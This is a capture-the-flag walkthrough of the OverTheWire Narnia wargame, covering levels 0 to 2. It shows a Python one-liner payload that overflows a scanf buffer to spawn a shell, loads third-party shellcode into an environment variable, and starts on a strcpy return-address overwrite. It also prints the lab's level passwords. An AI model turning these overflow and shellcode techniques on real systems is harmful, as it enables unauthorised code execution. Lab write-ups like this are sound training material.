# Walkthrough for the Narnia of OTW

## Introduction:
Try it for yourself before you look for help ;)

## Preparations
I added the server ``narnia.labs.overthewire.org'' and port 2226
into the ssh config file:

    Host narnia.labs.overthewire.org
    port 2226

## Level 0:

Username: narnia0
Passwort: [ narnia0 ]

The file ist stored in the directory /narnia, the application
is named narnia0, the source code is given in the file narnia0.c.

    cd /narnia

First of all we run the application once and take a look, what it does.

    ./narnia0

After prompting us with the target to change (aka. ``correct'') the value
from 0x41414141 -> 0xdeadbeef we are given the chance to enter something.
Entering ``something'' results in a hint, that this was not correct

    ./narnia0
    something

A single look into the source shows the path. The memory layout and use
of scanf cries for a buffer overflow. Now we just have to generate the payload
and ship it to the program.

Python can be used to create the payload:

    python -c "print(20*'a' + chr(0xef) + chr(0xbe) + chr(0xad) + chr(0xde))" | ./narnia0

which can be piped to the file. Now we are not yelled at, but nothing more is
happening. This is due to line 32. The opened shell is closed directly. This
can be fixed by piping multiple commands into the application:

    (python -c "print(20*'a' + chr(0xef) + chr(0xbe) + chr(0xad) + chr(0xde))"; cat)
        | ./narnia0

With the command ``whoami'' we can check, if everything worked:
    whoami
    -> narnia1

Fine, seems like it worked! Now we cat the password for the next level

    cat /etc/narnia_pass/narnia1

### Lessons learned:

Use ``cat'' to pass the input into the opened shell. This will be used in
many more cases.


## Level 1:

Username: narnia1
Passwort: [ efeidiedae ]

A quick peek in the source code shows, that the env var EGG has to be set.
Setting the var to commands like **ls** or **/bin/sh** results in a segfault.
This cries for runnable shellcode to be used.  We will use a shells-script from
a page liek shell-storm. At this moment i'm not capable of writing my own
shell-script from scratch without destroying everything.

Since we want a simple execve to bash i used the following script
    http://shell-storm.org/shellcode/files/shellcode-606.php
save the shellcode without the quotation marks and linebreaks in
a file **shellcode.comp**, upload it via scp and just pass it to EGG via echo:
    export EGG=$(echo -e $(cat shellcode.comp))

Now i can run ./narnia1, get the credentials for narnia2  and be happy

## Level 2:

Username: narnia1
Passwort: [ nairiepecu ]

The vulnerability is hidden in the strcpy and the size of 128 for the target
buffer. By copying more than 128 bytes the return adress can be modified

Using gdb and the python script **findLocation.py** finds the position of the 
return adress.
